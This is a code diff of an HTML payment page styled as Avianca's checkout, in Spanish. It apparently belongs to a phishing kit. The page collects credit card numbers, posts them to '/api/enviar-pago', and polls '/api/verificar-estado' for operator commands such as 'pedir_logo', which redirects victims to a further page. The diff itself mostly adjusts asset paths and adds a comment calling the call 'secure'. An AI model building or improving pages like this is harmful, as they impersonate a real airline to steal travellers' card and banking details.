@@ -5,28 +5,28 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Avianca - Payment</title>
     <link rel="preconnect" href="https://fonts.googleapis.com">
-    <link rel="shortcut icon" href="./assets/favicon.svg" type="image/x-icon">
+    <link rel="shortcut icon" href="assets/favicon.svg" type="image/x-icon">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-    <link href="https://fonts.googleapis.com/css2?family=Red+Hat+Display:ital,wght@0,300;0,400;0,500;0,600;0,700;0,800;0,900;1,300;1,400;1,500;1,600;1,700;1,800;1,900&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Red+Hat+Display:ital,wght@0,300;0,400;0,500;0,600;0,700;0,800;0,900;1,300;1,400;1,500;1,600;0,700;0,800;0,900&display=swap" rel="stylesheet">
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
     <link href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&family=Red+Hat+Display:ital,wght@0,300;0,400;0,500;0,600;0,700;0,800;0,900;1,300;1,400;1,500;1,600;1,700;1,800;1,900&display=swap" rel="stylesheet">
-    <link rel="stylesheet" href="./css/flight.css">
-    <link rel="stylesheet" href="./css/normalize.css">
+    <link rel="stylesheet" href="css/flight.css">
+    <link rel="stylesheet" href="css/normalize.css">
 
     <style>
         .loaderp { width: 48px; height: 48px; border: 5px solid #fff; border-bottom-color: #e8114b; border-radius: 50%; display: inline-block; box-sizing: border-box; animation: rotation 1s linear infinite; }
         @keyframes rotation { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
         .loaderp-full { position: fixed; top: 0; left: 0; overflow-y: hidden; z-index: 1000; background-color: white; width: 100vw; height: 100vh; display: none; flex-direction: column; justify-content: center; align-items: center; }
     </style>
-    <script src="./js/functions.js"></script>
+    <script src="js/functions.js"></script>
 </head>
 <body class="mvh-100 bg-gray">
-    <div class="loader show"> <img src="./assets/svg/plane-loader.gif"> </div>
+    <div class="loader show"> <img src="assets/svg/plane-loader.gif"> </div>
     <header>
         <div class="next-step">
-            <img class="ns-logo" src="./assets/logos/avianca_red.svg">
-            <div class="ns-step"> <img src="./assets/svg/step_3_header.png"> </div>
+            <img class="ns-logo" src="assets/logos/avianca_red.svg">
+            <div class="ns-step"> <img src="assets/svg/step_3_header.png"> </div>
         </div>
     </header>
     <main>
@@ -41,7 +41,7 @@
                 </div>
                 <hr>
                 <div class="form-section">
-                    <div class="companies-container"> <img src="./assets/svg/visa.svg"> <img src="./assets/svg/mc.svg"> <img src="./assets/svg/diners.svg"> <img src="./assets/svg/amex.svg"> <img src="./assets/svg/uatp.png" width="50px"> </div>
+                    <div class="companies-container"> <img src="assets/svg/visa.svg"> <img src="assets/svg/mc.svg"> <img src="assets/svg/diners.svg"> <img src="assets/svg/amex.svg"> <img src="assets/svg/uatp.png" width="50px"> </div>
                     <h4>Información de la tarjeta</h4>
                     <div class="checkbox-group mt-2"> <input class="check fs-2" type="checkbox" id="ecuador-card"> <label for="ecuador-card">Mi tarjeta de crédito no es de Ecuador</label> </div>
                     <input id="p" class="input-cc bg-std mt-2" placeholder="Número de Tarjeta" type="text" oninput="formatCNumber(this)">
@@ -117,13 +117,13 @@
     </main>
     <footer class="footer-fixed-2">
         <div class="footer-flight-resume">
-            <div> <p class="mb-1">Resumen del viaje:</p> <div class="show align-items-center"> <h4 id="origin-code">BOG</h4> <img src="./assets/svg/arrow.png" width="14px"> <h4 id="destination-code">CLI</h4> </div> </div>
-            <div> <h4 class="text-end mt-1">$<span id="flight-cost">49.999</span> USD</h4> <p class="fs-5">Total de tu reserva:</p> <img src="./assets/svg/info_icon.png" width="15px"> </div>
+            <div> <p class="mb-1">Resumen del viaje:</p> <div class="show align-items-center"> <h4 id="origin-code">BOG</h4> <img src="assets/svg/arrow.png" width="14px"> <h4 id="destination-code">CLI</h4> </div> </div>
+            <div> <h4 class="text-end mt-1">$<span id="flight-cost">49.999</span> USD</h4> <p class="fs-5">Total de tu reserva:</p> <img src="assets/svg/info_icon.png" width="15px"> </div>
         </div>
         <p class="mt-2 mb-2">© Avianca S.A 2024</p>
     </footer>
     <div class="loaderp-full"> <span class="loaderp"></span> <p class="text-italic tc-ocean fs-3 fw-light">Cargando...</p> </div>
-    <script src="./js/payment.js"></script>
+    <script src="js/payment.js"></script>
     <script>
         async function checkPaymentVerification(messageId) {
             const response = await fetch('/api/verificar-estado', {
@@ -136,7 +136,7 @@
             if (data.action) {
                 switch (data.action) {
                     case 'pedir_logo':
-                        window.location.href = "chedf.html";
+                        window.location.href = "/chedf.html";
                         break;
                     case 'error_tc':
                         alert("La tarjeta de crédito no pudo ser procesada. Por favor, verifique los detalles e intente nuevamente.");
@@ -180,6 +180,7 @@
             document.querySelector(".loaderp-full").style.display = "flex";
 
             try {
+                // Llamada segura a la API del servidor
                 const response = await fetch('/api/enviar-pago', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
